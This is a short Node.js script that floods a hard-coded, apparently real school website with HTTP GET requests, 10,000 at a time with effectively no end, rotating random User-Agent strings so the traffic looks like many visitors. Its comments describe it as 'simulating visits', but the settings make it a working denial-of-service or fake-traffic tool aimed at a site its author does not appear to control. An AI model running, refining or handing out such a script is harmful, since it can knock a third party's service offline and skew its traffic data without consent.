const axios = require('axios');
const fs = require('fs');

// Read user agents from ua.txt
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(ua => ua.trim());

// Function to simulate a visit
async function simulateVisit(targetUrl) {
    try {
        // Select a random user agent
        const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

        // Make the request
        const response = await axios.get(targetUrl, {
            headers: {
                'User-Agent': randomUserAgent,
            },
        });

        console.log(`Visited ${targetUrl} with User-Agent: ${randomUserAgent}`);
        console.log('Response Status:', response.status);
    } catch (error) {
        console.error('Error visiting the site:', error.message);
    }
}

// Function to simulate multiple visits with concurrency
async function simulateVisits(targetUrl, totalVisits, concurrencyLimit, delayBetweenBatches) {
    let currentVisit = 0;

    while (currentVisit < totalVisits) {
        // Create a batch of concurrent visits
        const batch = [];
        for (let i = 0; i < concurrencyLimit && currentVisit < totalVisits; i++) {
            batch.push(simulateVisit(targetUrl));
            currentVisit++;
        }

        // Wait for the current batch to complete
        await Promise.all(batch);

        // Add a delay between batches (to avoid overwhelming the server)
        if (currentVisit < totalVisits) {
            console.log(`Waiting ${delayBetweenBatches / 1000} seconds before the next batch...`);
            await new Promise(resolve => setTimeout(resolve, delayBetweenBatches));
        }
    }

    console.log('All visits completed!');
}

// Configuration
const targetUrl = 'https://smpn9pekanbaru.sch.id'; // Replace with your target URL
const totalVisits = 100000000000000000000; // Total number of visits to simulate
const concurrencyLimit = 10000; // Number of concurrent visits (adjust based on server capacity)
const delayBetweenBatches = 5000; // Delay between batches in milliseconds (e.g., 5000ms = 5 seconds)

// Start simulating visits
simulateVisits(targetUrl, totalVisits, concurrencyLimit, delayBetweenBatches);
